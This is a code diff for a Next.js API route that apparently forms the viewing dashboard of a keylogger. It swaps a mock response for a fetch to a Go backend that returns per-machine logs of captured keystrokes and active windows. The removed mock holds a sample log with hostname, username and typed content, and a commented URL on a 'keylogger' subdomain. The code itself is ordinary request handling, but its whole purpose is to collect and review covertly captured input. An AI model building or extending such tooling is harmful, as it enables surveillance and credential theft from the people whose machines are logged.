@@ -1,38 +1,45 @@
-import { NextResponse } from "next/server"
+import { NextResponse } from "next/server";
 
-// Mock endpoint - replace with actual Firebase integration
-export async function GET(request: Request, { params }: { params: { systemId: string } }) {
+interface LogEntry {
+  logStartTimeUTC: string;
+  logDurationSeconds: number;
+  loggedContent: string;
+  activeWindow: string;
+  serverTimestamp: string;
+}
+
+export async function GET(
+  request: Request,
+  { params }: { params: { systemId: string } }
+) {
   try {
-    const { systemId } = params
+    const { systemId } = params;
+    const goServerBaseUrl = process.env.SERVER_BASE_URL;
 
-    // This would typically fetch from Firebase
-    // const response = await fetch(`http://keylogger.doypid.com/api/logs/${systemId}`)
-
-    // Mock response for now
-    const mockLogs = {
-      "27214215126422": [
-        {
-          id: "1",
-          logDurationSeconds: 13.007452,
-          logStartTimeUTC: "2025-08-11T15:43:32.100970Z",
-          loggedContent: "first try on the exe",
-          serverTimestamp: "August 11, 2025 at 3:43:43 PM UTC-5",
-          systemInfo: {
-            ActiveWindow: "script.py - keylogger - Visual Studio Code",
-            Hostname: "DESKTOP-76GNVR1",
-            OS: "Windows",
-            OSRelease: "11",
-            SystemID: "27214215126422",
-            Username: "EMW81",
-          },
-        },
-      ],
+    if (!goServerBaseUrl) {
+      return NextResponse.json(
+        { error: "Go server base URL not configured" },
+        { status: 500 }
+      );
     }
 
-    const logs = mockLogs[systemId as keyof typeof mockLogs] || []
+    const response = await fetch(
+      `${goServerBaseUrl}/api/systems/${systemId}/logs`
+    );
 
-    return NextResponse.json({ logs })
+    if (!response.ok) {
+        const errorData = await response.json().catch(() => ({}));
+        console.error(`Failed to fetch logs for ${systemId} from Go server:`, response.status, errorData);
+      return NextResponse.json(
+        { error: `Failed to fetch logs from backend: ${response.statusText}` },
+        { status: response.status }
+      );
+    }
+
+    const data: { logs: LogEntry[] } = await response.json();
+    return NextResponse.json({ logs: data.logs });
   } catch (error) {
-    return NextResponse.json({ error: "Failed to fetch logs" }, { status: 500 })
+    console.error("Error fetching logs:", error);
+    return NextResponse.json({ error: "Failed to fetch logs" }, { status: 500 });
   }
 }
